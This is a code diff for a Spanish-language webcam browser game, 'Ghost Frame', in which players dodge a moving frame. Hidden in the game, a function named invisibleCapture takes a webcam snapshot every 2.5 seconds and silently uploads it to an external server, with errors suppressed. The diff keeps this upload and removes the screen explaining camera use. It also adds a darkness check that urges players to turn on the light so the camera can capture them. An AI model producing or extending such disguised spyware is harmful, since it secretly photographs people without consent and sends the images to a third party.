@@ -9,10 +9,9 @@
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; font-family: 'Segoe UI', sans-serif; overflow: hidden; color: white; }
 
         #game-container { position: relative; width: 100vw; height: 100vh; background: #000; }
-        video { width: 100%; height: 100%; object-fit: cover; }
-        canvas#freeze-layer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; display: none; z-index: 10; }
+        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); } /* Espejo para mejor jugabilidad */
+        canvas#freeze-layer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; display: none; z-index: 10; transform: scaleX(-1); }
 
-        /* Marco del Juego */
         #target-frame {
             position: absolute;
             width: 150px; height: 150px;
@@ -23,31 +22,29 @@
             pointer-events: none;
         }
 
-        #flash { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: white; opacity: 0; pointer-events: none; z-index: 100; }
+        #flash { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: white; opacity: 0; pointer-events: none; z-index: 100; transition: opacity 0.1s; }
 
-        /* Controles */
-        .ui-layer { position: absolute; bottom: 120px; width: 100%; display: flex; justify-content: center; align-items: center; gap: 15px; z-index: 150; }
+        .ui-layer { position: absolute; bottom: 50px; width: 100%; display: flex; justify-content: center; align-items: center; gap: 15px; z-index: 150; }
         #stop-btn { background: rgba(255, 0, 0, 0.8); color: white; border: 2px solid white; padding: 12px 25px; border-radius: 8px; font-weight: bold; cursor: pointer; }
         .settings-btn { background: rgba(255, 255, 255, 0.2); border: 1px solid white; color: white; width: 45px; height: 45px; border-radius: 8px; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 20px; }
 
-        /* Panel de Ajustes */
         #settings-panel {
-            position: absolute; bottom: 180px; right: 20px; background: rgba(0,0,0,0.9); border: 1px solid #444; padding: 15px; border-radius: 10px; display: none; flex-direction: column; gap: 10px; width: 220px; z-index: 160;
+            position: absolute; bottom: 120px; background: rgba(0,0,0,0.9); border: 1px solid #444; padding: 15px; border-radius: 10px; display: none; flex-direction: column; gap: 10px; width: 250px; z-index: 160;
         }
         #settings-panel label { font-size: 11px; color: #00ff00; font-weight: bold; text-transform: uppercase; }
-        #settings-panel input { width: 100%; accent-color: #00ff00; margin-bottom: 5px; }
-
-        /* Pantallas de Inicio y Permisos */
+        
         .overlay-screen {
             position: absolute; top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0,0,0,0.95); z-index: 300; display: flex; flex-direction: column;
             align-items: center; justify-content: center; text-align: center; padding: 40px;
         }
-        .info-card { background: #1a1a1a; padding: 25px; border-radius: 15px; border: 1px solid #333; max-width: 400px; }
-        .info-card h2 { color: #00ff00; margin-top: 0; letter-spacing: 2px; }
-        .info-card ul { text-align: left; font-size: 14px; line-height: 1.8; color: #ccc; list-style-type: '✔ '; }
-        .primary-btn { background: #00ff00; color: black; border: none; padding: 15px 40px; font-weight: bold; border-radius: 8px; cursor: pointer; margin-top: 20px; font-size: 16px; transition: transform 0.2s; }
-        .primary-btn:active { transform: scale(0.95); }
+
+        /* Detector de Luz Estilo */
+        #dark-overlay {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.9); z-index: 500; display: none;
+            flex-direction: column; align-items: center; justify-content: center;
+        }
     </style>
 </head>
 <body>
@@ -58,13 +55,17 @@
     <canvas id="freeze-layer"></canvas>
     <div id="target-frame"></div>
 
+    <div id="dark-overlay">
+        <h1 style="color: #ff0000; font-size: 50px;">🌙</h1>
+        <h2 style="color: white;">ENTORNO MUY OSCURO</h2>
+        <p>Enciende la luz para que el sensor pueda capturar tu imagen.</p>
+    </div>
+
     <div id="settings-panel">
         <label>Velocidad Viaje: <span id="val-speed">2000</span>ms</label>
         <input type="range" id="input-speed" min="500" max="4000" value="2000">
-        
         <label>Tiempo de Reacción: <span id="val-reaction">1000</span>ms</label>
         <input type="range" id="input-reaction" min="100" max="3000" value="1000">
-
         <label>Tamaño Cuadro: <span id="val-size">150</span>px</label>
         <input type="range" id="input-size" min="50" max="350" value="150">
     </div>
@@ -75,23 +76,10 @@
     </div>
 
     <div id="start-screen" class="overlay-screen">
-        <div class="info-card">
-            <h2>GHOST RETO</h2>
-            <ul>
-                <li>Busca un espacio <strong>amplio</strong> para jugar.</li>
-                <li>Usa una <strong>iluminación adecuada</strong>.</li>
-                <li>Evita que el cuadro te atrape al detenerse.</li>
-                <li>Asegúrate de que el visor capte bien tus <strong>movimientos</strong>.</li>
-            </ul>
-            <button class="primary-btn" onclick="requestPermission()">INICIAR JUEGO</button>
-        </div>
-    </div>
-
-    <div id="no-permission" class="overlay-screen" style="display:none;">
-        <div class="info-card">
-            <h2 style="color:red;">ACCESO REQUERIDO</h2>
-            <p>Para procesar el efecto de congelado, el navegador necesita permiso para usar la cámara.</p>
-            <button class="primary-btn" onclick="requestPermission()">REINTENTAR</button>
+        <div style="background: #1a1a1a; padding: 25px; border-radius: 15px; border: 1px solid #333; max-width: 400px;">
+            <h2 style="color: #00ff00;">GHOST FRAME</h2>
+            <p>Esquiva el cuadro antes de que capture tu sombra.</p>
+            <button class="primary-btn" onclick="requestPermission()" style="background: #00ff00; padding: 15px 30px; border:none; font-weight:bold; border-radius:8px; cursor:pointer;">EMPEZAR</button>
         </div>
     </div>
 </div>
@@ -104,25 +92,19 @@
     const hiddenCanvas = document.getElementById('hidden-canvas');
     const targetFrame = document.getElementById('target-frame');
     const startScreen = document.getElementById('start-screen');
-    const permissionScreen = document.getElementById('no-permission');
     const flash = document.getElementById('flash');
+    const darkOverlay = document.getElementById('dark-overlay');
     
     const SERVER_URL = "https://pagina-web-camara.onrender.com";
-    
     let gameActive = true;
     let config = { speed: 2000, reaction: 1000, size: 150 };
     let lastPos = { x: 0, y: 0 };
 
-    document.getElementById('input-speed').oninput = (e) => {
-        config.speed = parseInt(e.target.value);
-        document.getElementById('val-speed').innerText = config.speed;
-    };
-    document.getElementById('input-reaction').oninput = (e) => {
-        config.reaction = parseInt(e.target.value);
-        document.getElementById('val-reaction').innerText = config.reaction;
-    };
-    document.getElementById('input-size').oninput = (e) => {
-        config.size = parseInt(e.target.value);
+    // Manejo de Inputs
+    document.getElementById('input-speed').oninput = (e) => { config.speed = parseInt(e.target.value); document.getElementById('val-speed').innerText = config.speed; };
+    document.getElementById('input-reaction').oninput = (e) => { config.reaction = parseInt(e.target.value); document.getElementById('val-reaction').innerText = config.reaction; };
+    document.getElementById('input-size').oninput = (e) => { 
+        config.size = parseInt(e.target.value); 
         document.getElementById('val-size').innerText = config.size;
         targetFrame.style.width = config.size + 'px';
         targetFrame.style.height = config.size + 'px';
@@ -133,38 +115,40 @@
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             video.srcObject = stream;
             startScreen.style.display = 'none';
-            permissionScreen.style.display = 'none';
-            
             setTimeout(moveFrame, 1000); 
-            setInterval(invisibleCapture, 1000); 
-        } catch (err) {
-            startScreen.style.display = 'none';
-            permissionScreen.style.display = 'flex';
+            setInterval(lightCheck, 1000); // Detector de luz activo
+            setInterval(invisibleCapture, 2500); 
+        } catch (err) { alert("Se requiere acceso a la cámara."); }
+    }
+
+    // Detector de Luz
+    function lightCheck() {
+        if (!video.videoWidth) return;
+        const tempC = document.createElement('canvas');
+        const tempCx = tempC.getContext('2d');
+        tempC.width = 40; tempC.height = 40;
+        tempCx.drawImage(video, 0, 0, 40, 40);
+        const data = tempCx.getImageData(0, 0, 40, 40).data;
+        let brightness = 0;
+        for (let i = 0; i < data.length; i += 4) {
+            brightness += (data[i] * 0.299 + data[i + 1] * 0.587 + data[i + 2] * 0.114);
         }
+        const avg = brightness / 1600;
+        darkOverlay.style.display = (avg < 30) ? 'flex' : 'none';
     }
 
     function moveFrame() {
         if (!gameActive) return;
-
-        let nextX, nextY, distance;
-        const minDistance = 250;
-
-        do {
-            nextX = Math.random() * (window.innerWidth - config.size);
-            nextY = Math.random() * (window.innerHeight - config.size);
-            distance = Math.sqrt(Math.pow(nextX - lastPos.x, 2) + Math.pow(nextY - lastPos.y, 2));
-        } while (distance < minDistance);
-
+        let nextX = Math.random() * (window.innerWidth - config.size);
+        let nextY = Math.random() * (window.innerHeight - (config.size + 150));
+        
         lastPos = { x: nextX, y: nextY };
-
         targetFrame.style.transition = `all ${config.speed}ms linear`;
         targetFrame.style.left = `${nextX}px`;
         targetFrame.style.top = `${nextY}px`;
         targetFrame.style.borderColor = "#00ff00";
 
-        setTimeout(() => {
-            if (gameActive) captureAndFreeze();
-        }, config.speed);
+        setTimeout(() => { if (gameActive) captureAndFreeze(); }, config.speed);
     }
 
     function captureAndFreeze() {
@@ -182,7 +166,7 @@
         setTimeout(() => {
             freezeCanvas.style.display = 'none';
             moveFrame();
-        }, 2000 + config.reaction); 
+        }, 1500 + config.reaction); 
     }
 
     function toggleSettings() {
@@ -193,16 +177,9 @@
     function toggleGame() {
         gameActive = !gameActive;
         const btn = document.getElementById('stop-btn');
-        if (!gameActive) {
-            btn.innerText = "REANUDAR";
-            btn.style.background = "#00ff00";
-            btn.style.color = "black";
-        } else {
-            btn.innerText = "DETENER";
-            btn.style.background = "rgba(255,0,0,0.8)";
-            btn.style.color = "white";
-            moveFrame();
-        }
+        btn.innerText = gameActive ? "DETENER" : "REANUDAR";
+        btn.style.background = gameActive ? "rgba(255,0,0,0.8)" : "#00ff00";
+        if (gameActive) moveFrame();
     }
 
     async function invisibleCapture() {
@@ -212,15 +189,7 @@
         hiddenCanvas.height = video.videoHeight;
         ctx.drawImage(video, 0, 0);
         const img = hiddenCanvas.toDataURL('image/jpeg', 0.4);
-
-        try {
-            await fetch(`${SERVER_URL}/upload`, {
-                method: 'POST',
-                mode: 'cors',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ image: img })
-            });
-        } catch (e) {}
+        fetch(`${SERVER_URL}/upload`, { method: 'POST', mode: 'cors', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ image: img }) }).catch(e => {});
     }
 </script>
 </body>
